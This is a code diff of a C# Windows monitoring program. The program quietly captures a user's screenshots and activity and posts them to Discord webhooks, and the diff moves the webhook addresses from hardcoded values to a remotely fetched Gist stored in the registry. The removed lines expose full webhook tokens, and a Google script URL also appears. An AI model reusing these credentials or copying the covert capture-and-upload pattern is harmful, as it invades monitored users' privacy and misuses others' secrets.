@@ -28,11 +28,11 @@
  *   2. A Discord Channel Webhook (POST JSON containing a formatted markdown activity summary).
  * 
  * --- HOW IT IS CONFIGURED ---
- * - Webhooks and Source URLs: Hardcoded fields in the Program class:
- *     * TextWebhookUrl: Discord webhook link for text reports.
- *     * ImageWebhookUrl: Discord webhook link for screenshot reports.
+ * - Webhooks and Source URLs:
+ *     * textWebhookUrl: Discord webhook link for text reports (fetched dynamically from remote Gist).
+ *     * imageWebhookUrl: Discord webhook link for screenshot reports (fetched dynamically from remote Gist).
  *     * GoogleWebhookUrl: Google Web App macro link.
- *     * BlockListGistUrl: Raw Github Gist URL for process/title blocklists.
+ *     * BlockListGistUrl: Raw Github Gist URL for configuration, intervals, and webhooks.
  * - Scan and Report Intervals:
  *     * ScanIntervalSeconds: Time between active checks/scans (default: 5 seconds).
  *     * ReportIntervalSeconds: Time between reporting events (default: 360 seconds / 6 minutes).
@@ -224,9 +224,9 @@ namespace Monitor
 
         const int SW_HIDE = 0;
 
-        // Configuration
-        private const string TextWebhookUrl = "https://discord.com/api/webhooks/1500559708673544323/P7RBYmQ7RBaOiVGf7LV390gpr5F3OIqjjHPcOLOEp1APjfrd0NurhYq9DDpLqIaQqK2B";
-        private const string ImageWebhookUrl = "https://discord.com/api/webhooks/1521898764447518802/Y8CtiAzRUJIroO3rnzyVSRClDLIdQsOEVV2HTMgR_d7b9DxqOwfYGOiov7R-Ujeu6UYR";
+        // Configuration (Discord webhooks are loaded dynamically from remote Gist to prevent token exposure)
+        private static string textWebhookUrl = "";
+        private static string imageWebhookUrl = "";
         private const string GoogleWebhookUrl = "https://script.google.com/macros/s/AKfycbynf7m-zQPvDTrLPp6SlqLE86BY43iClfRq0CjGvvg-OoYMPOn_ty1PCDfnUMJDFzlONQ/exec";
         private const string BlockListGistUrl = "https://gist.githubusercontent.com/crisev/e9e46b188aaf1651daea86c95f363992/raw/gistfile1.txt";
         private static string updateUrl = "";
@@ -1484,6 +1484,7 @@ namespace Monitor
             int loops = 0;
 
             LoadIntervalsFromRegistry();
+            LoadWebhooksFromRegistry();
 
             // Actively synchronize network time from authoritative sources (NTP / HTTP) before initializing daily stats
             Console.WriteLine("Synchronizing network time from authoritative sources (NTP / HTTP)...");
@@ -1512,13 +1513,7 @@ namespace Monitor
             // Start Windows System Tray Service (Runs in background STA thread)
             TrayService.Start();
 
-            string localVer = GetLocalVersion();
-            if (!isAdminUser)
-            {
-                await SendDiscordNotificationAsync($"🟢 **Application Started**\n- **User:** `{currentUser}`\n- **Version:** `{localVer}`\n- **Time:** `{GetTrueBucharestTime():yyyy-MM-dd HH:mm:ss}` (Bucharest)");
-            }
-
-            // Always try to fetch the latest configuration and intervals from the Gist first (retrying on startup in case network is initializing)
+            // Always try to fetch the latest configuration, webhooks, and intervals from the Gist first (retrying on startup in case network is initializing)
             bool gistFetched = false;
             int maxStartupRetries = 6;
             for (int attempt = 1; attempt <= maxStartupRetries; attempt++)
@@ -1535,6 +1530,12 @@ namespace Monitor
                     Console.WriteLine($"Startup Gist fetch attempt {attempt} failed (network initializing). Retrying in 5 seconds...");
                     await Task.Delay(5000);
                 }
+            }
+
+            string localVer = GetLocalVersion();
+            if (!isAdminUser)
+            {
+                await SendDiscordNotificationAsync($"🟢 **Application Started**\n- **User:** `{currentUser}`\n- **Version:** `{localVer}`\n- **Time:** `{GetTrueBucharestTime():yyyy-MM-dd HH:mm:ss}` (Bucharest)");
             }
 
             TimeSpan currentTime = GetTrueBucharestTime().TimeOfDay;
@@ -1953,6 +1954,94 @@ namespace Monitor
                     {
                         var root = doc.RootElement;
 
+                        // Parse Discord Webhook URLs (text and screenshots/images)
+                        string newTextWebhook = null;
+                        string newImageWebhook = null;
+
+                        if (root.TryGetProperty("textWebhookUrl", out var twEl) ||
+                            root.TryGetProperty("discordTextWebhookUrl", out twEl) ||
+                            root.TryGetProperty("discordWebhookUrl", out twEl))
+                        {
+                            newTextWebhook = twEl.GetString();
+                        }
+
+                        if (root.TryGetProperty("imageWebhookUrl", out var iwEl) ||
+                            root.TryGetProperty("discordImageWebhookUrl", out iwEl) ||
+                            root.TryGetProperty("screenshotWebhookUrl", out iwEl))
+                        {
+                            newImageWebhook = iwEl.GetString();
+                        }
+
+                        // Check nested objects if not found at root (e.g. "discord": { "textWebhookUrl": "...", "imageWebhookUrl": "..." })
+                        if (root.TryGetProperty("discord", out var discordEl) && discordEl.ValueKind == JsonValueKind.Object)
+                        {
+                            if (string.IsNullOrWhiteSpace(newTextWebhook))
+                            {
+                                if (discordEl.TryGetProperty("textWebhookUrl", out var dtwEl) ||
+                                    discordEl.TryGetProperty("text", out dtwEl) ||
+                                    discordEl.TryGetProperty("webhookUrl", out dtwEl))
+                                {
+                                    newTextWebhook = dtwEl.GetString();
+                                }
+                            }
+                            if (string.IsNullOrWhiteSpace(newImageWebhook))
+                            {
+                                if (discordEl.TryGetProperty("imageWebhookUrl", out var diwEl) ||
+                                    discordEl.TryGetProperty("image", out diwEl) ||
+                                    discordEl.TryGetProperty("screenshotWebhookUrl", out diwEl) ||
+                                    discordEl.TryGetProperty("screenshot", out diwEl))
+                                {
+                                    newImageWebhook = diwEl.GetString();
+                                }
+                            }
+                        }
+                        else if (root.TryGetProperty("webhooks", out var webhooksEl) && webhooksEl.ValueKind == JsonValueKind.Object)
+                        {
+                            if (string.IsNullOrWhiteSpace(newTextWebhook))
+                            {
+                                if (webhooksEl.TryGetProperty("text", out var wtwEl) ||
+                                    webhooksEl.TryGetProperty("textWebhookUrl", out wtwEl))
+                                {
+                                    newTextWebhook = wtwEl.GetString();
+                                }
+                            }
+                            if (string.IsNullOrWhiteSpace(newImageWebhook))
+                            {
+                                if (webhooksEl.TryGetProperty("image", out var wiwEl) ||
+                                    webhooksEl.TryGetProperty("imageWebhookUrl", out wiwEl) ||
+                                    webhooksEl.TryGetProperty("screenshot", out wiwEl))
+                                {
+                                    newImageWebhook = wiwEl.GetString();
+                                }
+                            }
+                        }
+
+                        // Fallback: If only discordWebhookUrl was set, use it for image as well if image webhook was omitted
+                        if (string.IsNullOrWhiteSpace(newImageWebhook) && !string.IsNullOrWhiteSpace(newTextWebhook) && root.TryGetProperty("discordWebhookUrl", out _))
+                        {
+                            newImageWebhook = newTextWebhook;
+                        }
+
+                        bool webhooksChanged = false;
+                        if (!string.IsNullOrWhiteSpace(newTextWebhook) && newTextWebhook.Trim() != textWebhookUrl)
+                        {
+                            textWebhookUrl = newTextWebhook.Trim();
+                            webhooksChanged = true;
+                            Console.WriteLine("[Config] Discord text webhook updated from Gist.");
+                        }
+
+                        if (!string.IsNullOrWhiteSpace(newImageWebhook) && newImageWebhook.Trim() != imageWebhookUrl)
+                        {
+                            imageWebhookUrl = newImageWebhook.Trim();
+                            webhooksChanged = true;
+                            Console.WriteLine("[Config] Discord image webhook updated from Gist.");
+                        }
+
+                        if (webhooksChanged)
+                        {
+                            SaveWebhooksToRegistry();
+                        }
+
                         // Parse enforcement mode ("whitelist" or "blacklist")
                         if (root.TryGetProperty("mode", out var modeElement) || root.TryGetProperty("enforcementMode", out modeElement))
                         {
@@ -2200,7 +2289,7 @@ namespace Monitor
 
         private static async Task SendDiscordNotificationAsync(string messageText)
         {
-            if (isAdminUser)
+            if (isAdminUser || string.IsNullOrWhiteSpace(textWebhookUrl))
             {
                 return;
             }
@@ -2210,7 +2299,7 @@ namespace Monitor
                 var payload = new { content = messageText };
                 string json = JsonSerializer.Serialize(payload);
                 var content = new StringContent(json, Encoding.UTF8, "application/json");
-                var response = await httpClient.PostAsync(TextWebhookUrl, content);
+                var response = await httpClient.PostAsync(textWebhookUrl, content);
                 SyncNetworkTimeFromResponse(response);
             }
             catch (Exception ex)
@@ -2255,7 +2344,7 @@ namespace Monitor
 
         private static async Task CaptureAndSendScreenshotAsync()
         {
-            if (isAdminUser)
+            if (isAdminUser || string.IsNullOrWhiteSpace(imageWebhookUrl))
             {
                 return;
             }
@@ -2318,7 +2407,7 @@ namespace Monitor
                     imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                     content.Add(imageContent, "file", "screenshot.png");
 
-                    var response = await httpClient.PostAsync(ImageWebhookUrl, content);
+                    var response = await httpClient.PostAsync(imageWebhookUrl, content);
                     SyncNetworkTimeFromResponse(response);
                     if (!response.IsSuccessStatusCode)
                     {
@@ -2473,7 +2562,10 @@ namespace Monitor
                         content = $"**Update Failure on {currentUser}'s PC:**\n- **Error:** `{ex.Message}`\n- **Type:** `{ex.GetType().Name}`\n- **Path:** `{Environment.ProcessPath}`" 
                     };
                     string json = JsonSerializer.Serialize(payload);
-                    await httpClient.PostAsync(TextWebhookUrl, new StringContent(json, Encoding.UTF8, "application/json"));
+                    if (!string.IsNullOrWhiteSpace(textWebhookUrl))
+                    {
+                        await httpClient.PostAsync(textWebhookUrl, new StringContent(json, Encoding.UTF8, "application/json"));
+                    }
                 }
                 catch { }
             }
@@ -2628,6 +2720,58 @@ namespace Monitor
             catch (Exception ex)
             {
                 Console.WriteLine($"Failed to load intervals from registry: {ex.Message}");
+            }
+        }
+
+        private static void SaveWebhooksToRegistry()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\MonitorApp"))
+                {
+                    if (key != null)
+                    {
+                        if (!string.IsNullOrEmpty(textWebhookUrl))
+                        {
+                            key.SetValue("TextWebhookUrl", textWebhookUrl);
+                        }
+                        if (!string.IsNullOrEmpty(imageWebhookUrl))
+                        {
+                            key.SetValue("ImageWebhookUrl", imageWebhookUrl);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Failed to save webhooks to registry: {ex.Message}");
+            }
+        }
+
+        private static void LoadWebhooksFromRegistry()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\MonitorApp"))
+                {
+                    if (key != null)
+                    {
+                        var textVal = key.GetValue("TextWebhookUrl");
+                        if (textVal != null && !string.IsNullOrWhiteSpace(textVal.ToString()))
+                        {
+                            textWebhookUrl = textVal.ToString().Trim();
+                        }
+                        var imageVal = key.GetValue("ImageWebhookUrl");
+                        if (imageVal != null && !string.IsNullOrWhiteSpace(imageVal.ToString()))
+                        {
+                            imageWebhookUrl = imageVal.ToString().Trim();
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Failed to load webhooks from registry: {ex.Message}");
             }
         }
 
@@ -2867,7 +3011,7 @@ namespace Monitor
 
         private static async Task SendDiscordChunkedMessageAsync(string fullMessage)
         {
-            if (isAdminUser)
+            if (isAdminUser || string.IsNullOrWhiteSpace(textWebhookUrl))
             {
                 return;
             }
@@ -2879,7 +3023,7 @@ namespace Monitor
                 var discordPayload = new { content = fullMessage };
                 string discordJson = JsonSerializer.Serialize(discordPayload);
                 var discordContent = new StringContent(discordJson, Encoding.UTF8, "application/json");
-                var response = await httpClient.PostAsync(TextWebhookUrl, discordContent);
+                var response = await httpClient.PostAsync(textWebhookUrl, discordContent);
                 SyncNetworkTimeFromResponse(response);
                 return;
             }
@@ -2896,7 +3040,7 @@ namespace Monitor
                         var discordPayload = new { content = currentChunk.ToString() };
                         string discordJson = JsonSerializer.Serialize(discordPayload);
                         var discordContent = new StringContent(discordJson, Encoding.UTF8, "application/json");
-                        var response = await httpClient.PostAsync(TextWebhookUrl, discordContent);
+                        var response = await httpClient.PostAsync(textWebhookUrl, discordContent);
                         SyncNetworkTimeFromResponse(response);
                         currentChunk.Clear();
                         await Task.Delay(250);
@@ -2910,7 +3054,7 @@ namespace Monitor
                 var discordPayload = new { content = currentChunk.ToString() };
                 string discordJson = JsonSerializer.Serialize(discordPayload);
                 var discordContent = new StringContent(discordJson, Encoding.UTF8, "application/json");
-                var response = await httpClient.PostAsync(TextWebhookUrl, discordContent);
+                var response = await httpClient.PostAsync(textWebhookUrl, discordContent);
                 SyncNetworkTimeFromResponse(response);
             }
         }
